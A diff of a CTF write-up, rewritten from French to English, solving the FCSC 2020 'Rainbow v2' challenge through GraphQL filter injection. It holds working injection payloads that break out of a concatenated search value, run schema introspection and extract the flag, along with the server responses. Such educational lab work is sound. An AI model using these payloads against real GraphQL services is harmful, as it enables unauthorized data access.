@@ -1,98 +1,240 @@
 ---
-title: FR - FCSC 2020 - Write Up - Rainbow v2
+title: FCSC 2020 Write-Up - Rainbow v2 - Advanced GraphQL Filter Injection
 date: 2020-05-18 10:20:00 +07:00
-tags: [francais, FCSC, CTF, WU, Web, php, GraphQL]
-description: Write Up du challenge Rainbow v2 du FCSC 2020.
+tags: [english, FCSC, CTF, writeup, web, security, GraphQL, injection]
+description: Exploiting GraphQL filter injection through carefully crafted payloads to bypass security controls in FCSC 2020's Rainbow v2 challenge.
 ---
 
-## Rainbow v2
-On découvre le même site que le précédent, à la différence près qu'il est sécurisé (o/).  
-On remarque que la requête est différente, ici, on ne construis pas nous même la requete, on y donne simplement une valeur qui sera concaténé à la requête.
+## Challenge Overview
 
-Testons quelques valeurs et analysons le résultat :
+Rainbow v2 builds upon its predecessor with improved security measures. Unlike the first version where we could construct arbitrary GraphQL queries, this iteration restricts user input to a single search value that gets concatenated into a predefined query structure.
 
-##### Quelques tests plus tard...
-```js
+The security model has changed: we can no longer craft complete queries, only inject values into an existing query template.
+
+## Initial Analysis
+
+### Testing the Waters
+
+I started by probing the application with various inputs to understand how it processes our search parameter:
+
+#### Test Case 1: Null Byte Injection
+```bash
 search=%00
 ```
-Result : `list all datas`
+**Result:** Lists all data (interesting! The null byte bypasses the filter)
 
-```js
+#### Test Case 2: Single Quote
+```bash
 search='
 ```
-Result : `Nothing`
+**Result:** Nothing returned
 
-```js
+#### Test Case 3: Double Quote
+```bash
 search="
 ```
-Result :
-```js
-{"errors":[{"message":"Syntax Error: Cannot parse the unexpected character \"%\".","locations":[{"line":1,"column":52}]}]}
+**Result:** Syntax error exposed!
+```json
+{
+  "errors": [{
+    "message": "Syntax Error: Cannot parse the unexpected character \"%\".",
+    "locations": [{"line": 1, "column": 52}]
+  }]
+}
 ```
 
-#### Diagnostique
-On peux facilement imaginer que la requete est la même que le challenge précédent, testons des injections :
-```js
-{ allCooks (filter: { firstname: {like: "%%"}}) { nodes { firstname, lastname, speciality, price }}}
+### Understanding the Query Structure
+
+Based on error messages and behavior, i hypothesized that the backend query from Rainbow v1 was still in use, but now only the filter value was user-controllable:
+
+```graphql
+{ 
+  allCooks (filter: { firstname: {like: "%INJECT_HERE%"}}) { 
+    nodes { 
+      firstname, 
+      lastname, 
+      speciality, 
+      price 
+    }
+  }
+}
 ```
 
-Après diverses tentatives, j'ai remarqué que cette fois-ci, on peut chercher par firstname ET lastname...  
-Modifions la requête en conséquence :
-```js
-{ allCooks (
-filter: {
-  or: [
-    {lastname: {like: "%INJECT_HERE%"}},
-    {firstname: {like: "%INJECT_HERE%"}}
-  ],
- }) { nodes { firstname, lastname, speciality, price }}}
+Through further testing, i discovered the application was actually searching across **both** firstname and lastname fields using an `or` filter:
+
+```graphql
+{ 
+  allCooks (
+    filter: {
+      or: [
+        {lastname: {like: "%INJECT_HERE%"}},
+        {firstname: {like: "%INJECT_HERE%"}}
+      ],
+    }
+  ) { 
+    nodes { 
+      firstname, 
+      lastname, 
+      speciality, 
+      price 
+    }
+  }
+}
 ```
 
-### Exploitation !
-Après avoir fait proc diverses erreurs, j'ai pu construire mon payload :
-```js
+## Exploitation Strategy
+
+### The Injection Concept
+
+The goal was to break out of the filter context and inject additional GraphQL operations. I needed to:
+
+1. Close the existing filter structure
+2. Add introspection or custom queries
+3. Handle the remaining query syntax that would be appended
+
+### Building the Payload - Iteration 1
+
+My first attempt at injecting introspection:
+
+```bash
 %"}}{firstname:{like:"%%"}}]}){nodes{id}}__schema{types{name,fields{name}}}allCooks(filter:{or:[{lastname:{like:"%
 ```
-On remarque une erreur étrange :
+
+This attempts to:
+- Close the current lastname filter: `%"`
+- Close the firstname object: `}}`
+- Complete the `or` array: `{firstname:{like:"%%"}}]`
+- Close the filter and add nodes: `}){nodes{id}}`
+- Inject introspection: `__schema{types{name,fields{name}}}`
+- Start a new allCooks (which will be completed by the trailing query)
+
+**Result:** Field conflict error!
+```json
+{
+  "errors": [{
+    "message": "Fields \"allCooks\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional."
+  }]
+}
 ```
-[{"message":"Fields \"allCooks\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional."
-```
-La raison pour laquelle l'erreur est proc, c'est à cause de la redondance de allCooks, ajoutons un commentaire :
-```js
+
+### Understanding the Conflict
+
+The error reveals that we can't have two `allCooks` fields in the same query with different arguments. GraphQL prevents this ambiguity. The solution? Comment out the trailing query!
+
+### Building the Payload - Iteration 2
+
+Adding a GraphQL comment (`#`) to neutralize the rest of the original query:
+
+```bash
 %"}}{firstname:{like:"%%"}}]}){nodes{id}}__schema{types{name,fields{name}}}#
 ```
-Résultat :
-```
-{"errors":[{"message":"Syntax Error: Cannot parse the unexpected character \"%\".","locations":[{"line":2,"column":1}]}]}
-```
-Une syntax error... Voyons ce que donne cette requête au complet :
 
-```js
+**Result:** New error!
+```json
 {
-  allCooks (filter: {
-        or: [
-            {lastname: {like:"%%"}}
-            {firstname: {like:"%%"}}
-        ]
-      }
-    )
-    {nodes { firstname}}
-    __schema{types{name,fields{name}}}#allCooks(filter:{or:[{lastname:{like:"%%"}}{firstname:{like:"%%"}}],}){nodes{firstname,lastname,speciality,price}}}
+  "errors": [{
+    "message": "Syntax Error: Cannot parse the unexpected character \"%\".",
+    "locations": [{"line": 2, "column": 1}]
+  }]
+}
 ```
 
-On remarque vite le problème, il manque la fermeture du premier bracket :
-```js
+### Debugging the Syntax
+
+Let me reconstruct what the complete query looks like:
+
+```graphql
+{
+  allCooks (
+    filter: {
+      or: [
+        {lastname: {like:"%"}}{firstname:{like:"%%"}}]}){nodes{id}}__schema{types{name,fields{name}}}#%"}},
+        {firstname: {like:"%"}}{firstname:{like:"%%"}}]}){nodes{id}}__schema{types{name,fields{name}}}#%"}}
+      ]
+    }
+  ) {
+    nodes { 
+      firstname, 
+      lastname, 
+      speciality, 
+      price 
+    }
+  }
+}
+```
+
+The problem is clear: I'm closing the filter context but not properly closing the parent `allCooks` operation bracket!
+
+### Building the Payload - Final Version
+
+Adding the missing closing bracket:
+
+```bash
 %"}}{firstname:{like:"%%"}}]}){nodes{id}}__schema{types{name,fields{name}}}}#
 ```
 
-Une fois éxecutée, la requête nous livre les informations sensibles du schema dont allFlagNotTheSameTableNames et flagNotTheSameFieldName.  
-On adapte la requète pour lister les flags :
-```js
+**Success!** The introspection query executes and reveals the schema, including two critical discoveries:
+
+- `allFlagNotTheSameTableNames` - The table name
+- `flagNotTheSameFieldName` - The field name
+
+The challenge authors deliberately obfuscated these names to prevent easy guessing!
+
+### Extracting the Flag
+
+With the schema revealed, i crafted the final payload to extract flags:
+
+```bash
 %"}}{firstname:{like:"%%"}}]}){nodes{firstname}} allFlagNotTheSameTableNames (filter: { flagNotTheSameFieldName: {like: "%%"}}) { nodes { flagNotTheSameFieldName}}}#
 ```
 
-#### Set as finished
-Et hop :
-```js
-{"data":{"allCooks":{"nodes":[{"firstname":"Thibault"},{"firstname":"Antoinette"},{"firstname":"Bernard"},{"firstname":"Trycia"},{"firstname":"Jaleel"},{"firstname":"Isaac"},{"firstname":"Delbert"},{"firstname":"Paula"},{"firstname":"Teagan"},{"firstname":"Garfield"},{"firstname":"Elisabeth"},{"firstname":"Casey"},{"firstname":"Consuelo"},{"firstname":"Luciano"},{"firstname":"Piper"},{"firstname":"Jace"}]},"allFlagNotTheSameTableNames":{"nodes":[{"flagNotTheSameFieldName":"FCSC{70c48061ea21935f748b11188518b3322fcd8285b47059fa99df37f27430b071}"}]}}}
+This payload:
+1. Closes the original filter properly
+2. Completes the first `allCooks` query
+3. Adds a new query for `allFlagNotTheSameTableNames`
+4. Comments out the trailing syntax
+
+**Result:**
+```json
+{
+  "data": {
+    "allCooks": {
+      "nodes": [
+        {"firstname": "Thibault"},
+        {"firstname": "Antoinette"},
+        {"firstname": "Bernard"},
+        {"firstname": "Trycia"},
+        {"firstname": "Jaleel"},
+        {"firstname": "Isaac"},
+        {"firstname": "Delbert"},
+        {"firstname": "Paula"},
+        {"firstname": "Teagan"},
+        {"firstname": "Garfield"},
+        {"firstname": "Elisabeth"},
+        {"firstname": "Casey"},
+        {"firstname": "Consuelo"},
+        {"firstname": "Luciano"},
+        {"firstname": "Piper"},
+        {"firstname": "Jace"}
+      ]
+    },
+    "allFlagNotTheSameTableNames": {
+      "nodes": [{
+        "flagNotTheSameFieldName": "FCSC{70c48061ea21935f748b11188518b3322fcd8285b47059fa99df37f27430b071}"
+      }]
+    }
+  }
+}
 ```
+
+## Conclusion
+
+This challenge was significantly more interesting than v1. The developers tried to secure it by restricting user input to just the search value, but they made the classic mistake: string concatenation instead of parameterized queries.
+
+The vulnerability came down to breaking out of the filter context by injecting special GraphQL characters (`}`, `{`, `#`). Once I understood the query structure through error messages, it was just a matter of carefully crafting payloads to close the existing syntax and inject my own queries. The `#` comment trick to neutralize the trailing query was key.
+
+## References
+
+- [GraphQL Injection](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
+- [HackerOne GraphQL Reports](https://hackerone.com/reports?q=graphql)
+- [API Hacking: GraphQL](https://medium.com/@ghostlulzhacks/api-hacking-graphql-7b2866ba1cf2)
